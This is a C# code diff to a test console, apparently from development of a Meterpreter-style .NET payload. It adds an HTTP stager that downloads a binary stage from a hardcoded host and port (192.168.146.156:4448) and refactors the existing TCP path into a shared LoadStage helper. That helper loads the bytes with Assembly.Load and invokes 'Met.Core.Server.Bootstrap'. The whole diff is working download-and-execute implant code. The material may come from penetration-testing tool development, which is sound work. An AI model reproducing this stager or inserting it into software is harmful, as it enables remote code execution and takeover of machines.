@@ -13,7 +13,22 @@ namespace TestConsole
     {
         static void Main(string[] args)
         {
-            SimpleTcpStageTest();
+            //SimpleTcpStageTest();
+            SimpleHttpStageTest();
+        }
+
+        static void SimpleHttpStageTest()
+        {
+            var port = 4448;
+            var scheme = "http";
+            var host = @"192.168.146.156";
+            var uri = @"/DgpgB6pR-3HmeudnuwLKUghZuMxaWdHo0XuT-ZzO0Xcyv54gGsB7aig4hD2wRV-Q9ulIdw2KZdN497W9kvyMBsey9";
+
+            var url = string.Format(@"{0}://{1}:{2}{3}/", scheme, host, port, uri);
+
+            var wc = new System.Net.WebClient();
+            var stage = wc.DownloadData(url);
+            LoadStage(stage, wc);
         }
 
         static void SimpleTcpStageTest()
@@ -32,23 +47,27 @@ namespace TestConsole
                 {
                     var fullStageSize = r.ReadInt32();
                     var fullStage = r.ReadBytes(fullStageSize);
-
-                    using (var memStream = new MemoryStream(fullStage))
-                    using (var memReader = new BinaryReader(memStream))
-                    {
-                        // skip over the MZ header
-                        memReader.ReadBytes(2);
-                        // read in the length of metsrv
-                        var metSrvSize = memReader.ReadInt32();
-                        // Point the reader to the configuration
-                        memReader.BaseStream.Seek(metSrvSize, SeekOrigin.Begin);
-
-                        var assembly = Assembly.Load(fullStage);
-                        var type = assembly.GetType("Met.Core.Server");
-                        type.InvokeMember("Bootstrap", BindingFlags.Public | BindingFlags.Static | BindingFlags.InvokeMethod,
-                            null, null, new object[] { memReader, tcpClient });
-                    }
+                    LoadStage(fullStage, tcpClient);
                 }
+            }
+        }
+
+        static void LoadStage(byte[] bytes, object client)
+        {
+            using (var memStream = new MemoryStream(bytes))
+            using (var memReader = new BinaryReader(memStream))
+            {
+                // skip over the MZ header
+                memReader.ReadBytes(2);
+                // read in the length of metsrv
+                var metSrvSize = memReader.ReadInt32();
+                // Point the reader to the configuration
+                memReader.BaseStream.Seek(metSrvSize, SeekOrigin.Begin);
+
+                var assembly = Assembly.Load(bytes);
+                var type = assembly.GetType("Met.Core.Server");
+                type.InvokeMember("Bootstrap", BindingFlags.Public | BindingFlags.Static | BindingFlags.InvokeMethod,
+                    null, null, new object[] { memReader, client });
             }
         }
 
